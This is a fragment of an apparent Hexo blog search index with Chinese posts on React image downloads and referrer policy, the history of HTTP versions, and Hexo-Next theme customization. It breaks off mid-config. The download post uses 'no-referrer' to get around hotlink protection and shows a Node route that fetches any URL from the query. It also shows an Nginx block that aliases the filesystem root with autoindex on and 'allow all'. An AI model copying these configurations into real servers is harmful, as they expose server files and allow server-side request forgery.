class=\"title\">Download</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">        <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&#123;url&#125;</span> /&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">        <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&#123;url&#125;</span>&gt;</span>link<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\">  );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> Download;</span><br></pre></td></tr></table></figure></p>\n<span id=\"more\"></span>\n<h2 id=\"no-referrer\"><a href=\"#no-referrer\" class=\"headerlink\" title=\"no-referrer\"></a>no-referrer</h2><p>这个模块会被直接挂载到<code>App.js</code>上，按道理会展示一张地址为<code>https://img.moegirl.org.cn/common/f/ff/YJSNPI_Ascii_Art..png</code>的图片。下方带有一个连接。打开浏览器，却看到图片未能加载，连接也无法正常跳转到图片，于是打开控制台一看究竟，发现图片的请求报<code>403</code>错误。是连接出错了吗？事实上不是：<strong>直接复制连接地址到浏览器种发现是可以正常打开的</strong>。</p>\n<p>HTTP请求体的<code>header</code>中有一个<code>referrer</code>字段，用来表示发起HTTP请求的源地址信息，这个<code>referrer</code>信息是可以省略但是不可修改的。你能设置是否带上这个<code>referrer</code>信息，单不能定制<code>referrer</code>的值。</p>\n<p>服务器端在拿到这个<code>referrer</code>值后就可以进行相关的处理，比如图片资源，可以通过<code>referrer</code>值判断请求是否来自本站，若不是则返回403或者重定向返回其他信息，从而实现图片的防盗链。上面出现<code>403</code>就是因为，请求的是别人服务器上的资源，但把自己的<code>referrer</code>信息带过去了，被对方服务器拦截返回了<code>403</code>。</p>\n<p>在前端可以通过<code>meta</code>来设置referrer policy(来源策略)。所以针对上面的<code>403</code>情况的解决方法，就是把<code>referrer</code>设置成<code>no-referrer</code>，这样发送请求不会带上<code>referrer</code>信息，对方服务器也就无法拦截了。<br><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;referrer&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;no-referrer&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><br>隐藏<code>referrer</code>信息后，张口闭眼成功展示！<br><img src=\"1.png\" alt=\"\"></p>\n<p>浏览器中<code>referrer</code>默认的值是<code>no-referrer-when-downgrade</code>，就是除了降级请求的情况以外都会带上<code>referrer</code>信息。降级请求是指HTTPS协议的地址去请求HTTP协议，所以上面<code>403</code>的情况还有另一种解决方法就是，请求的图片地址换成HTTP协议，自己的地址使用HTTP协议，这样降级请求也不会带上<code>referrer</code>。</p>\n<h3 id=\"配置Nginx防盗链\"><a href=\"#配置Nginx防盗链\" class=\"headerlink\" title=\"配置Nginx防盗链\"></a>配置Nginx防盗链</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">location ~* \\.(gif|jpg|png|jpeg)$ &#123;</span><br><span class=\"line\">    valid_referers none  valid.url.com;</span><br><span class=\"line\">    if ($invalid_referer) &#123;</span><br><span class=\"line\">            return 403;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>首先第一句以文件格式后缀匹配出图片资源路径，然后通过<code>valid_referers</code>添加合法的<code>referer</code>地址，加上<code>none</code>，表示没有传<code>referer</code>也是合法的，最后<code>referer</code>不合法的情况返回<code>403</code>。如果想跳其他地址或返回其他图片资源可以这样：<code>rewrite xxx.xxx.com/xxx.jpg</code>。</p>\n<p>HTTP头部中还有一个与<code>referrer</code>类似的叫<code>orgin</code>的字段，在发送跨域请求或预检请求(preflight request)时会带上这个参数，他用来表示发起请求的服务器地址，这个参数是必定会传的，然后服务器端用此字段来判断是否允许跨域。</p>\n<h2 id=\"下载资源\"><a href=\"#下载资源\" class=\"headerlink\" title=\"下载资源\"></a>下载资源</h2><p>我们除了展示图片，还要实现一个点击按钮下载的需求。于是<code>Download.jsx</code>加上一个<code>button</code>，点击时候触发下载。假定在<code>download()</code>实现下载事件。<br><figure class=\"highlight jsx\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React <span class=\"keyword\">from</span> <span class=\"string\">&#x27;react&#x27;</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> url = <span class=\"string\">&quot;https://img.moegirl.org.cn/common/f/ff/YJSNPI_Ascii_Art..png&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> download = <span class=\"function\">(<span class=\"params\">url</span>)=&gt;</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">//TOTO</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Download</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">        <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&#123;url&#125;</span> /&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">        <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&#123;url&#125;</span>&gt;</span>link<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"symbol\">&amp;nbsp;</span></span></span><br><span class=\"line\"><span class=\"xml\">        <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">onClick</span>=<span class=\"string\">&#123;()</span>=&gt;</span>download(url)&#125;&gt;download<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"xml\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span></span><br><span class=\"line\">  );</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> Download;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"window-open\"><a href=\"#window-open\" class=\"headerlink\" title=\"window.open\"></a>window.open</h3><p>用<code>windows.open(url)</code>在可以下载<code>docx</code>，<code>exe</code>等浏览器无法展示的文件，单对于图片和<code>mp4</code>，<code>mp3</code>会直接在新页面打开。</p>\n<p>不出所料，直接在新页面打开了图片，没有触发下载。</p>\n<h3 id=\"创建虚拟DOM-a\"><a href=\"#创建虚拟DOM-a\" class=\"headerlink\" title=\"创建虚拟DOM a\"></a>创建虚拟DOM a</h3><p>网上常见的JS控制下载的方法就是创建一个虚拟的<code>a</code>类型的DOM，然后将点击事件分发给它，根据它的<code>download</code>属性下载<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> download=<span class=\"function\">(<span class=\"params\">url</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> aLink = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">&#x27;a&#x27;</span>)</span><br><span class=\"line\">    aLink.download = <span class=\"string\">&#x27;Picture.png&#x27;</span> </span><br><span class=\"line\">    aLink.href = url </span><br><span class=\"line\">    aLink.dispatchEvent(<span class=\"keyword\">new</span> MouseEvent(<span class=\"string\">&#x27;click&#x27;</span>, &#123;&#125;))</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>但是经过测试并没有达到预期的下载效果，而是直接在页面打开了图片。这是因为图片地址和前端不同源，针对跨域的图片，不能用这种方式下载。作为对照，用React在<code>public</code>目录下的<code>logo192.png</code>图片做测试：<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> url = <span class=\"string\">&quot;/logo192.png&quot;</span></span><br></pre></td></tr></table></figure><br>发现同源图片是可以通过该种方式正常下载的，且下载的文件名和<code>download</code>属性的值保持一致：<br><img src=\"2.png\" alt=\"\"></p>\n<h3 id=\"canvas-toDataURL\"><a href=\"#canvas-toDataURL\" class=\"headerlink\" title=\"canvas.toDataURL\"></a>canvas.toDataURL</h3><p>通过url转base64，利用canvas.toDataURL的API转化成base6<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> download = <span class=\"function\">(<span class=\"params\">url</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span> (<span class=\"function\">(<span class=\"params\">resolve,reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">let</span> image = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\">      image.onload = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">let</span> canvas = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">&#x27;canvas&#x27;</span>);</span><br><span class=\"line\">        canvas.width = <span class=\"built_in\">this</span>.naturalWidth;</span><br><span class=\"line\">        canvas.height = <span class=\"built_in\">this</span>.naturalHeight;</span><br><span class=\"line\">        <span class=\"comment\">// 将图片插入画布并开始绘制</span></span><br><span class=\"line\">        canvas.getContext(<span class=\"string\">&#x27;2d&#x27;</span>).drawImage(image, <span class=\"number\">0</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"comment\">// result</span></span><br><span class=\"line\">        <span class=\"keyword\">let</span> result = canvas.toDataURL(<span class=\"string\">&#x27;image/png&#x27;</span>)</span><br><span class=\"line\">        resolve(result);</span><br><span class=\"line\">      &#125;;</span><br><span class=\"line\">      <span class=\"comment\">// CORS 策略，会存在跨域问题https://stackoverflow.com/questions/20424279/canvas-todataurl-securityerror</span></span><br><span class=\"line\">      image.setAttribute(<span class=\"string\">&quot;crossOrigin&quot;</span>,<span class=\"string\">&#x27;Anonymous&#x27;</span>);</span><br><span class=\"line\">      image.src = url;</span><br><span class=\"line\">      <span class=\"comment\">// 图片加载失败的错误处理</span></span><br><span class=\"line\">      image.onerror = <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">        reject(<span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">&#x27;图片流异常&#x27;</span>));</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>这种方式经过测试，同样会存在跨域问题，虽然已经设置了允许跨域，但是浏览器对此却是拒绝的。如果图片链接是跨域的，浏览器会禁用download，只允许打开图片而不允许下载。</p>\n<h3 id=\"Content-disposition\"><a href=\"#Content-disposition\" class=\"headerlink\" title=\"Content-disposition\"></a>Content-disposition</h3><p>前端拿到图片的流信息后，需要做进一步转化处理，将流信息转化成一个本地的下载地址，这对前端是一种性能上的消耗，其实这一过程是多余的。HTTP协议响应头<code>Content-disposition</code>可以控制用户请求所得的内容存为一个文件的时候提供一个默认的文件名，文件直接在浏览器上显示或者在访问时弹出文件下载对话框。在中间层开个通用的下载接口，可以支持任意类型的文件下载。<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">router.get(<span class=\"string\">&#x27;/common/download&#x27;</span>, <span class=\"function\">(<span class=\"params\">req, res, next</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> url = req.query.url</span><br><span class=\"line\">  <span class=\"keyword\">const</span> fileName = req.query.fileName</span><br><span class=\"line\">  request.get(&#123; url, <span class=\"attr\">encoding</span>: <span class=\"literal\">null</span> &#125;, <span class=\"function\">(<span class=\"params\">error, response, body</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (error) &#123;</span><br><span class=\"line\">      next(error)</span><br><span class=\"line\">      <span class=\"keyword\">return</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> fileType = response.headers[<span class=\"string\">&#x27;content-type&#x27;</span>].split(<span class=\"string\">&#x27;/&#x27;</span>)[<span class=\"number\">1</span>]</span><br><span class=\"line\">    res.setHeader(<span class=\"string\">&#x27;Content-disposition&#x27;</span>, getContentDisposition(fileName, fileType))</span><br><span class=\"line\">    res.setHeader(<span class=\"string\">&#x27;Content-type&#x27;</span>, response.headers[<span class=\"string\">&#x27;content-type&#x27;</span>])</span><br><span class=\"line\">    res.send(body)</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getContentDisposition</span>(<span class=\"params\">fileName, fileType</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"string\">`attachment; filename=<span class=\"subst\">$&#123;<span class=\"built_in\">encodeURIComponent</span>(fileName)&#125;</span>.<span class=\"subst\">$&#123;fileType&#125;</span>; filename*=utf-8&#x27;&#x27;<span class=\"subst\">$&#123;<span class=\"built_in\">encodeURIComponent</span>(fileName)&#125;</span>.<span class=\"subst\">$&#123;fileType&#125;</span>;`</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"application-octet-stream\"><a href=\"#application-octet-stream\" class=\"headerlink\" title=\"application/octet-stream\"></a>application/octet-stream</h3><p>一般文件服务器相应文件请求的时候，都会在<code>Content-Type</code>种说明文件类型，浏览器也就基于此判断执行的方式是打开开始下载。如果是<code>application/octet-stream</code>类型的，则浏览器会判定位这是个不支持的二进制类型数据，所以会触发下载。于是可以在文件服务器上修改<code>Content-Type: application/octet-stream</code>来欺骗浏览器。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">location /download/ &#123;</span><br><span class=\"line\">    alias /;</span><br><span class=\"line\">    add_header Content-Type application/octet-stream;</span><br><span class=\"line\">    allow all;</span><br><span class=\"line\">    autoindex on;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>注意：<code>Content-disposition</code>的设置需要注意兼容firefox以及IE浏览器</p>\n<blockquote>\n<p>参考文献：</p>\n<ul>\n<li><a href=\"https://www.jianshu.com/p/56df73d0d128?utm_source=oschina-app\">html访问图片资源403问题(http referrer)</a></li>\n</ul>\n</blockquote>\n"},{"title":"HTTP协议的发展史","url":"/2021/04/02/HTTP%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%8F%91%E5%B1%95%E5%8F%B2/","content":"<h2 id=\"HTTP-0-9\"><a href=\"#HTTP-0-9\" class=\"headerlink\" title=\"HTTP/0.9\"></a>HTTP/0.9</h2><p>1991年发布的HTTP/0.9只是一个草案，纯文本格式。蒂姆.伯纳斯.李 最初设想的系统里的文档都是只读的，所以只允许用”GET”动作从服务器上获取HTML文档，并且在响应请求之后立即关闭连接，功能非常有限。此时的HTTP协议没有请求头和请求体的概念，只能用于只读文档请求。</p>\n<h2 id=\"HTTP-1-0\"><a href=\"#HTTP-1-0\" class=\"headerlink\" title=\"HTTP/1.0\"></a>HTTP/1.0</h2><p>时隔5年，发布的HTTP/1.0</p>\n<ul>\n<li>规定了HTTP的请求头，请求体，以及响应头，相应体的概念，并在Header里引入了协议版本号</li>\n<li>支持了GET，POST，HEAD等多种方法。</li>\n<li>增加了HTTP相应状态码的概念</li>\n<li>传输从数据不再仅限于文本</li>\n</ul>\n<p>此时的HTTP协议已经和如今的HTTP协议极为类似了。HTTP/1.0采用了短链接，即每次请求一个资源都需要建立一个TCP请求，完成一整套握手和挥手的过程。如：当有100个图片资源时，就会发起100个TCP请求。频繁的连接建立与断开极大消耗了资源。</p>\n<span id=\"more\"></span>\n<h2 id=\"HTTP-1-1\"><a href=\"#HTTP-1-1\" class=\"headerlink\" title=\"HTTP/1.1\"></a>HTTP/1.1</h2><p>为此，HTTP/1.1请求头多出了<code>Connection: Keep-Alive</code>属性，允许浏览器与远端服务器建立长连接。同时还加入<code>Timeout</code>属性来控制超时。</p>\n<p>此时请求100个图片资源只要建立一次TCP连接，因此极大的提升了效率。HTTP/1.1还允许浏览器同时建立多个连接，一个浏览器默认的连接上限为6个。浏览器请求数据的方式从HTTP/1.0的串行短链接转变为HTTP/1.1的串行并行共存的长连接。</p>\n<p>此外HTTP/1.1还进行了多项优化：</p>\n<ul>\n<li>增加了PUT，DELETE等方法</li>\n<li>允许数据分块（chunk），以应对传输大文件</li>\n<li>强制<code>Host</code>属性，使得一台物理机可以通过VirtualHost部署多个站点</li>\n</ul>\n<p>HTTP/1.1增肌了pipeline，允许一个TCP连接中串行的执行多个HTTP请求。相应慢的请求会阻塞后续的请求，从而降低了性能。这个问题将在HTTP/2中解决。</p>\n<h2 id=\"HTTP-2\"><a href=\"#HTTP-2\" class=\"headerlink\" title=\"HTTP/2\"></a>HTTP/2</h2><p>随着互联网的发展，传输的数据量越来越大。2015年推出的HTTP/2主要优化了性能：</p>\n<ul>\n<li>对原本的明文数据采用二进制压缩</li>\n<li>允许IO多路复用</li>\n<li>模仿BT协议，将数据打散成块，使用单链接+帧的方式传输</li>\n<li>对越来越大的头部数据进行压缩与缓存</li>\n<li>服务端可以主动push，一个请求可以有多个返回。在HTTP/2中基于Google的SPDY协议。</li>\n</ul>\n<p>可以用这个网站测试HTTP/1.1和HTTP/2的性能区别：<a href=\"https://http2.akamai.com/demo\">https://http2.akamai.com/demo</a><br><img src=\"1.png\" alt=\"\"><br>可以看出在加载一张由多个小图片构成的大图的时候，HTTP/2比HTTP/1.1快了好几倍。开发者工具中网络连接显示HTTP/1.1的方式浏览器建立了多个连接，而HTTP/2下浏览器只建立了一个连接。</p>\n<p>HTTP/2本身支持非加密的HTTP协议（h2c），但大部分浏览器都之实现了通过TLS加密的HTTP/2协议（h2），所以实际上基本是强制要求HTTPS。以go的gin框架为例，他在HTTPS下允许会默认执行HTTP/2协议。</p>\n<p>新建一个gin项目，首先测试HTTP协议：<br><figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> main</span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\tr := gin.Default()</span><br><span class=\"line\">\tr.GET(<span class=\"string\">&quot;/ping&quot;</span>, <span class=\"function\"><span class=\"keyword\">func</span><span class=\"params\">(c *gin.Context)</span></span> &#123;</span><br><span class=\"line\">\t\tc.JSON(<span class=\"number\">200</span>, gin.H&#123;</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;message&quot;</span>: <span class=\"string\">&quot;pong&quot;</span>,</span><br><span class=\"line\">\t\t&#125;)</span><br><span class=\"line\">\t&#125;)</span><br><span class=\"line\">\tr.Run(<span class=\"string\">&quot;0.0.0.0:8888&quot;</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>启动后在firefox输入<code>http://localhost:8888/ping</code>，看到响应头版本为HTTP/1.1。<br><img src=\"2.png\" alt=\"\"></p>\n<p>接下来测试HTTPS下的响应头。在gin项目下生成HTTPS key和pem文件：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">openssl genrsa -out ./server.key 2048</span><br><span class=\"line\">openssl req -new -x509 -key ./server.key -out ./server.pem -days 365</span><br></pre></td></tr></table></figure><br>代码修改为：<br><figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> main</span><br><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;</span><br><span class=\"line\">\tr := gin.Default()</span><br><span class=\"line\">\tr.GET(<span class=\"string\">&quot;/ping&quot;</span>, <span class=\"function\"><span class=\"keyword\">func</span><span class=\"params\">(c *gin.Context)</span></span> &#123;</span><br><span class=\"line\">\t\tc.JSON(<span class=\"number\">200</span>, gin.H&#123;</span><br><span class=\"line\">\t\t\t<span class=\"string\">&quot;message&quot;</span>: <span class=\"string\">&quot;pong&quot;</span>,</span><br><span class=\"line\">\t\t&#125;)</span><br><span class=\"line\">\t&#125;)</span><br><span class=\"line\">    <span class=\"comment\">// r.Run(&quot;0.0.0.0:8888&quot;)</span></span><br><span class=\"line\">\tr.RunTLS(<span class=\"string\">&quot;0.0.0.0:8888&quot;</span>,<span class=\"string\">&quot;./server.pem&quot;</span>,<span class=\"string\">&quot;./server.key&quot;</span>) </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>此时在浏览器改用HTTPS协议请求刚才的接口：<code>https://localhost:8888/ping</code>，发现请求头已经变成了HTTP/2<br><img src=\"3.png\" alt=\"\"></p>\n<p>如果在Chrome浏览器上，会无法查看HTTP/2协议的原始请求头，这是因为HTTP/2是二进制传输。如果看到Chrome的开发者工具中一个请求的头没有<code>View Source</code>选项，那一般就是HTTP/2了。</p>\n<h2 id=\"HTTP-3\"><a href=\"#HTTP-3\" class=\"headerlink\" title=\"HTTP/3\"></a>HTTP/3</h2><p>HTTP3.0从TCP协议切换到UDP协议。<br><img src=\"https://zhuanlan.zhihu.com/p/143464334\" alt=\"https://zhuanlan.zhihu.com/p/143464334\"></p>\n<blockquote>\n<p>参考文档：</p>\n<ul>\n<li>[<a href=\"https://blog.csdn.net/yangluxin763730141/article/details/107115545)[https://blog.csdn.net/yangluxin763730141/article/details/107115545\">https://blog.csdn.net/yangluxin763730141/article/details/107115545)[https://blog.csdn.net/yangluxin763730141/article/details/107115545</a>]</li>\n<li><a href=\"https://whoisnian.com/2018/09/21/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%88%87%E6%8D%A2%E5%88%B0HTTP2/\">服务器切换到HTTP/2</a><br><a href=\"https://www.cnblogs.com/AhuntSun-blog/p/12021886.html\">https://www.cnblogs.com/AhuntSun-blog/p/12021886.html</a></li>\n</ul>\n</blockquote>\n","tags":["HTTP"]},{"title":"Hexo-Next定制化","url":"/2022/01/10/Hexo-Next%E5%AE%9A%E5%88%B6%E5%8C%96/","content":"<p>之前折腾了不少Hexo的玩法，也写过零星的几篇Hexo文章，为了便于查阅这里做个整合。</p>\n<p>自从迁移到<a href=\"https://github.com/theme-next/hexo-theme-next\">Next</a>主题后就发觉这也许是实用性最好的Hexo主题，以后大概率不会更换其他主题，所以以后一些个性化修改也只基于他。</p>\n<p>博客项目目录：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">_config.yml # Hexo主配置</span><br><span class=\"line\">public/</span><br><span class=\"line\">source/</span><br><span class=\"line\">  _drafts/</span><br><span class=\"line\">  _posts/</span><br><span class=\"line\">themes/</span><br><span class=\"line\">  next/</span><br><span class=\"line\">    _config.yml # Next主题配置</span><br></pre></td></tr></table></figure></p>\n<span id=\"more\"></span>\n<h2 id=\"开启Mathjax支持\"><a href=\"#开启Mathjax支持\" class=\"headerlink\" title=\"开启Mathjax支持\"></a>开启Mathjax支持</h2><blockquote>\n<p>参考：<a href=\"https://murphypei.github.io/blog/2019/03/hexo-render-mathjax.html\">https://murphypei.github.io/blog/2019/03/hexo-render-mathjax.html</a></p>\n</blockquote>\n<p>Hexo的markdown解释器默认不支持Latex等数学格式，但是我们可以通过安装第三方库来解决这一问题。</p>\n<h3 id=\"使用Kramed代替Marked\"><a href=\"#使用Kramed代替Marked\" class=\"headerlink\" title=\"使用Kramed代替Marked\"></a>使用Kramed代替Marked</h3><p>Hexo默认的渲染引擎是<code>marked</code>，但是<code>marked</code>不支持mathjax。 <code>kramed</code>是在<code>marked</code>的基础上进行修改。我们在工程目录下执行以下命令来安装<code>kramed</code><br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm uninstall hexo-renderer-marked --save</span><br><span class=\"line\">npm install hexo-renderer-kramed --save</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"解决冲突\"><a href=\"#解决冲突\" class=\"headerlink\" title=\"解决冲突\"></a>解决冲突</h3><p>当安装完成后，部分mathjax代码渲染依然可能有问题，原因是和markdown语法有冲突。例如<code>*</code>可能会被识别成加粗标记，解决办法是采用mathjax的转义符<code>\\ast</code>。而<code>|</code>会和表格符冲突，应使用过<code>\\vert</code>。</p>\n<p>但是下标符<code>_</code>和markdown的斜体标记冲突，需要手动修改解析规则。修改：<code>node_modules/kramed/lib/rules/inline.js</code>。</p>\n<p>替换11行和20行<br><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// escape: /^\\\\([\\\\`*&#123;&#125;\\[\\]()#$+\\-.!_&gt;])/,</span></span><br><span class=\"line\"><span class=\"attr\">escape</span>: <span class=\"regexp\">/^\\\\([`*\\[\\]()#$+\\-.!_&gt;])/</span>,</span><br><span class=\"line\">...</span><br><span class=\"line\"><span class=\"comment\">// em: /^\\b_((?:__|[\\s\\S])+?)_\\b|^\\*((?:\\*\\*|[\\s\\S])+?)\\*(?!\\*)/,</span></span><br><span class=\"line\"><span class=\"attr\">em</span>: <span class=\"regexp\">/^\\*((?:\\*\\*|[\\s\\S])+?)\\*(?!\\*)/</span>,</span><br></pre></td></tr></table></figure></p>\n<p>对于Hexo Next主题，需要在<strong>Next主题</strong>的<strong>_config.yml</strong>中额外配置：<br><figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">mathjax:</span></span><br><span class=\"line\">  <span class=\"attr\">enable:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  <span class=\"attr\">per_page:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  <span class=\"attr\">cdn:</span> <span class=\"string\">//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML</span></span><br></pre></td></tr></table></figure></p>\n<p>最后重新生成：<code>hexo clean &amp;&amp; hexo g</code></p>\n<h3 id=\"博文中开启mathjax\"><a href=\"#博文中开启mathjax\" class=\"headerlink\" title=\"博文中开启mathjax\"></a>博文中开启mathjax</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">---</span><br><span class=\"line\">title: Testing Mathjax</span><br><span class=\"line\">category: Uncategorized</span><br><span class=\"line\">date: 2017/05/03</span><br><span class=\"line\">mathjax: true</span><br><span class=\"line\">---</span><br></pre></td></tr></table></figure>\n<p>此时已经可以在Hexo中使用mathjax编写数学公式了。测试一下：</p>\n<script type=\"math/tex; mode=display\">\nE = mc^2</script><script type=\"math/tex; mode=display\">\nA_1 A_2 \\dots A_n</script><script type=\"math/tex; mode=display\">\n\\xrightarrow[A]{B}</script><script type=\"math/tex; mode=display\">\n\\underset{0\\leq j \\leq k-1}{\\arg\\min}</script><script type=\"math/tex; mode=display\">\nA \\underset{G}{\\Rightarrow} B</script><script type=\"math/tex; mode=display\">\nA \\stackrel{i}{\\Rightarrow} B</script><script type=\"math/tex; mode=display\">\nA \\underset{G}{\\stackrel{i}{\\Longrightarrow}} B</script><h2 id=\"添加可对话的Live2D看板娘\"><a href=\"#添加可对话的Live2D看板娘\" class=\"headerlink\" title=\"添加可对话的Live2D看板娘\"></a>添加可对话的Live2D看板娘</h2><p>Live 2D是一种应用于电子游戏的绘图渲染技术，由日本Cybernoids公司开发，通过一系列的连续图像和人物建模来生成一种类似二维图像的三维模型，换句话说就是2D的素材实现一定程度的3D效果，但只能是一定程度3D，因为Live 2D人物无法大幅度转身。Hexo提供了<code>hexo-helper-live2d</code>插件来引入live 2D看板娘。</p>\n<h3 id=\"创建看板娘\"><a href=\"#创建看板娘\" class=\"headerlink\" title=\"创建看板娘\"></a>创建看板娘</h3><p>使用命令<code>npm install --save hexo-helper-live2d</code>安装live2d模块。再安装umaru模型：<code>npm install --save live2d-widget-model-umaru</code></p>\n<p>编辑<code>_config.yml</code>写入配置：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">live2d:</span><br><span class=\"line\">  enable: true</span><br><span class=\"line\">  pluginModelPath: assets/</span><br><span class=\"line\">  model:</span><br><span class=\"line\">    #模板目录，在node_modules里</span><br><span class=\"line\">    use: live2d-widget-model-umaru</span><br><span class=\"line\">  display:</span><br><span class=\"line\">    position: left</span><br><span class=\"line\">    width: 200 </span><br><span class=\"line\">    height: 200</span><br><span class=\"line\">    hOffset: 20     #水平偏移</span><br><span class=\"line\">    vOffset: 50    #垂直偏移</span><br><span class=\"line\">  mobile:</span><br><span class=\"line\">    # 在手机端显示</span><br><span class=\"line\">    show: false   </span><br><span class=\"line\">  rect:</span><br><span class=\"line\">    opacity: 0.7</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"添加对话框\"><a href=\"#添加对话框\" class=\"headerlink\" title=\"添加对话框\"></a>添加对话框</h3><p>继续修改<code>_config.yml</code>:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">live2d:</span><br><span class=\"line\">  dialog:</span><br><span class=\"line\">    enable: true #开启对话</span><br><span 